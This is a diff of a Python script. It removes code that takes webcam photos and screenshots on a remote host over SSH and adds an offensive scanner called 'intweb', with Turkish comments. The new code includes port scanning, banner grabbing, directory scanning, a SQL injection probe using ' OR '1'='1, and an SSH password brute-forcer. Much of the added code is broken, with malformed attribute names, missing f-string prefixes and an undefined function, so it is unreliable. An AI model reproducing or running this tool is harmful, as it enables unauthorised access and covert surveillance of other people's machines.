@@ -1,126 +1,133 @@
-#!/bin/bash
-
-import subprocess
+import socket
 import argparse
-import json
-import os
 import requests
-from requests.exceptions import RequestException
+from bs4 import BeautifulSoup
 
-# Configuration file path
-CONFIG_FILE = 'config.json'
-IP_SERVICE_URL = 'https://api.ipify.org?format=json'
-
-def get_public_ip():
+def port_scan(target_host, target_ports):
     try:
-        response = requests.get(IP_SERVICE_URL)
-        response.raise_for_status()
-        return response.json()['ip']
-    except RequestException as e:
-        print(f"Error getting public IP: {e}")
-        return None
+        target_ip = socket.gethostbyname(target_host)
+    except socket.gaierror:
+        print(f'Hedef "{target_host}" çözümlenemedi.')
+        return []
 
-def load_config():
-    if not os.path.exists(CONFIG_FILE):
-        return {}
-    
-    with open(CONFIG_FILE, 'r') as file:
-        try:
-            config = json.load(file)
-        except json.JSONDecodeError as e:
-            print(f"Error decoding config file: {e}")
-            return {}
-    
-    return config
+    print(f'Tarama başlatılıyor: {target_host}')
 
-def save_config(config):
+    open_ports = []
+    for port in target_ports:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(1)
+        result = sock.connect_ex((target_ip, port))
+        if result == 0:
+            open_ports.append(port)
+            print(f'Port {port} açık')
+        sock.close()
+
+    return open_ports
+
+def http_header_scan(target_url):
     try:
-        with open(CONFIG_FILE, 'w') as file:
-            json.dump(config, file, indent=4)
-    except IOError as e:
-        print(f"Error saving config file: {e}")
+        response = requests.head(target_url, timeout=3)
+        print(f'HTTP başlığı alındı: {response.headers}')
+    except requests.exceptions.RequestException as e:
+        print(f'Hata: {e}')
 
-def take_photo(ip, port):
-    print(f"Taking photo from camera at {ip}:{port}")
+def sql_injection_scan(target_url):
+    # Örnek SQL enjeksiyon taraması
+    payload = "' OR '1'='1"
     try:
-        result = subprocess.run(
-            ["ssh", f"user@{ip}", "fswebcam -r 1280x720 --jpeg 85 -D 1 /tmp/webcam.jpg"],
-            check=True,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            text=True
-        )
-        with open("camera_output.txt", "w") as f:
-            f.write(result.stdout)
-        print(f"Photo taken successfully. Output saved to 'camera_output.txt'.")
-    except subprocess.CalledProcessError as e:
-        with open("camera_error.txt", "w") as f:
-            f.write(e.stderr)
-        print(f"Error taking photo: {e}")
-
-def take_screen_photo(ip, port):
-    print(f"Taking screen photo from {ip}:{port}")
-    try:
-        result = subprocess.run(
-            ["ssh", f"user@{ip}", "scrot /tmp/screenshot.png"],
-            check=True,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            text=True
-        )
-        with open("screen_output.txt", "w") as f:
-            f.write(result.stdout)
-        print(f"Screen photo taken successfully. Output saved to 'screen_output.txt'.")
-    except subprocess.CalledProcessError as e:
-        with open("screen_error.txt", "w") as f:
-            f.write(e.stderr)
-        print(f"Error taking screen photo: {e}")
-
-def main():
-    parser = argparse.ArgumentParser(description='Ethical tool - should be used within the same network.')
-    parser.add_argument('-ip', '--ipv4', type=str, help='Specify the IP address')
-    parser.add_argument('-p', '--port', type=int, required=True, help='Specify the port number')
-    parser.add_argument('-c', '--camera-photo', action='store_true', help='Take a photo from the camera')
-    parser.add_argument('-s', '--screen-photo', action='store_true', help='Take a screen photo')
-    parser.add_argument('--uip', '--use-public-ip', action='store_true', help='Use the public IP address')
-
-    args = parser.parse_args()
-
-    if args.uip:
-        public_ip = get_public_ip()
-        if public_ip:
-            args.ipv4 = public_ip
+        response = requests.get(target_url + f"/search?query={payload}", timeout=5)
+        if "error" in response.text:
+            print("SQL enjeksiyonu bulundu.")
         else:
-            print("Could not retrieve public IP address.")
-            return
+            print("SQL enjeksiyonu tespit edilemedi.")
+    except requests.exceptions.RequestException as e:
+        print(f'Hata: {e}')
 
-    config = load_config()
+def vulnerability_scan(target_url):
+    # Temel güvenlik zafiyet taraması (örneğin XSS kontrolü)
+    try:
+        response = requests.get(target_url, timeout=5)
+        soup = BeautifulSoup(response.text, 'html.parser')
+        forms = soup.find_all('form')
+        if forms:
+            print('XSS açığı olabilir: Formlar bulundu.')
+        else:
+            print('XSS açığı bulunamadı.')
+    except requests.exceptions.RequestException as e:
+        print(f'Hata: {e}')
+def brute_force_ssh(host, username, password_list):
+    for password in password_list:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(1)
+        result = sock.connect_ex((host, 22))
+        if result == 0:
+            try:
+                import paramiko
+                client = paramiko.SSHClient()
+                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                client.connect(host, username=username, password=password)
+                print(f'Başarılı SSH girişi: {username}@{host} - {password}')
+                client.close()
+                return
+            except paramiko.AuthenticationException:
+                pass
+            except ImportError:
+                print('Paramiko modülü eksik. Lütfen yükleyin: pip install paramiko')
+        sock.close()
 
-    if args.ipv4:
-        config['ipv4'] = args.ipv4
-        save_config(config)
+def dir_scan(target_url, dir_list):
+    for directory in dir_list:
+        url = f"{target_url}/{directory}"
+        try:
+            response = requests.get(url, timeout=3)
+            if response.status_code == 200:
+                print(f'Bulunan dizin: {url}')
+        except requests.exceptions.RequestException as e:
+            pass
 
-    ip = config.get('ipv4')
-    port = args.port
-
-    if not ip:
-        print("IP address must be specified either via command line or in the configuration file.")
-        return
-
-    if args.camera_photo:
-        take_photo(ip, port)
-    elif args.screen_photo:
-        take_screen_photo(ip, port)
-    else:
-        print("No action specified. Use -c to take a camera photo or -s to take a screen photo.")
-
+def banner_grab(target_host, target_port):
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(1)
+        sock.connect((target_host, target_port))
+        sock.send(b'HEAD / HTTP/1.0\r\n\r\n')
+        banner = sock.recv(1024)
+        print(f'Banner bilgisi: {banner.decode()}')
+        sock.close()
+    except socket.error as e:
+        print(f'Hata: {e}')
 if __name__ == '__main__':
-    print("""
-                      █╗███╗ ██╗████████╗██╗ ██╗███████╗██████╗
-██║████╗ ██║╚══██╔══╝██║ ██║██╔════╝██╔══█ █╗
-██║██╔██╗ ██║ ██║ ██║ █╗ ██║█████╗ ██████╔╝
-██║██║╚██╗██║ ██║ ██║███╗██║██╔══╝ ██╔══██ ╗
-██║██║ ╚████║ ██║ ╚███╔███╔╝███████╗██████ ╔╝
-╚═╝╚═╝ ╚═══╝ ╚═╝ ╚══╝╚══╝ ╚══════╝╚═════╝
-    """)
-    main()
+    parser = argparse.ArgumentParser(description='intweb', prog='intweb', formatter_class=argparse.RawDescriptionHelpFormatter)
+    parser.add_argument('target', help='Hedef IP veya URL', )
+    parser.add_argument("-v", "--vulnerability-scanner", help='Vulnerability scan')
+    parser.add_argument("-s", "--sql-injection", help='Sql injection Scan')
+    parser.add_argument('-u', '--username', help='target mail for bruteforce')
+    parser.add_argument("-ps", '--password-list', help='password list for bruteforce')
+    parser.add_argument("-b", '--bruteforce-ssh', help='Bruteforce')
+    parser.add_argument('--dirscan', action='store_true', help='Dir scanning')
+    parser.add_argument('--banner', action='store_true', help='Banner Grabbing')
+    parser.add_argument('-d', '--dir', help='dir for dirscan')
+    parser.add_argument('-p', '--ports', nargs='+', type=int, default=[80, 443], 
+                        help='Taranacak port numaraları (varsayılan: 80, 443)')
+    
+    args = parser.parse_args()
+    target = args.target
+    ports = args.ports
+    passw = args.password-list
+    us = args.username
+    dir = args.dir
+    open_ports = port_scan(target, ports)
+    if open_ports:
+        # HTTP başlığı taraması sadece ilk açık port için yapılıyor
+        http_header_scan(f'http://{target}:{open_ports[0]}')
+    if args.vulnerability-scanner:
+    	vulnerability_scan('http://{target}')
+    if args.sql-injection:
+    	sql_injection_scan('http://{target}')
+    if args.bruteforce-ssh:
+    	brute_force_ssh('http://{target}', us, passw)
+    if args.dirscan:
+    	dirscan('http://{target}', dir)
+    if args.banner:
+    	banner_grab('http://{target}', ports)
+    
